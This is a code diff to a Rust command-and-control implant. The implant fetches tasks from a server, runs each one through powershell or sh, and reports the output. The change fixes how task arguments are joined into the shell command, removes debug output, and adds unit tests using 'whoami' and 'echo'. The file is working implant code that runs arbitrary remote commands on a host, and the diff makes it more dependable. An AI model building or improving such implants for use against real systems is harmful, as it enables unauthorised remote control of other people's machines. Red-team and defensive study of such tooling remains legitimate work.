@@ -97,21 +97,21 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
             Vec::new()
         });
 
-        dbg!(&tasks);
-
         for task in tasks {
             println!("Executing command: {}", task.command);
             let now = SystemTime::now();
 
-            dbg!(&task);
+            // Build the full script string so arguments land inside the command rather than as
+            // flags on the shell itself.
+            let full_command = build_command_string(&task.command, &task.args);
 
-            // Shell out the command (use cmd.exe on Windows)
+            // Shell out the command (use powershell on Windows)
             let result = if cfg!(target_os = "windows") {
                 Command::new("powershell")
-                    .args(["-c", &task.command, &task.args.join(" ")])
+                    .args(["-NoProfile", "-Command", &full_command])
                     .output()
             } else {
-                Command::new("sh").args(["-c", &task.command]).output()
+                Command::new("sh").args(["-c", &full_command]).output()
             };
 
             let task_result = match result {
@@ -167,4 +167,29 @@ fn get_local_ip(target_host: &str, target_port: u16) -> Result<String, Box<dyn E
     let socket = UdpSocket::bind("0.0.0.0:0")?;
     socket.connect((target_host, target_port))?;
     Ok(socket.local_addr()?.ip().to_string())
+}
+
+/// Join a command and its arguments into a single shell script string.
+pub fn build_command_string(command: &str, args: &[String]) -> String {
+    if args.is_empty() {
+        command.to_string()
+    } else {
+        format!("{} {}", command, args.join(" "))
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn build_command_string_without_args() {
+        assert_eq!(build_command_string("whoami", &[]), "whoami");
+    }
+
+    #[test]
+    fn build_command_string_with_args() {
+        let args = vec!["hello".to_string(), "world".to_string()];
+        assert_eq!(build_command_string("echo", &args), "echo hello world");
+    }
 }
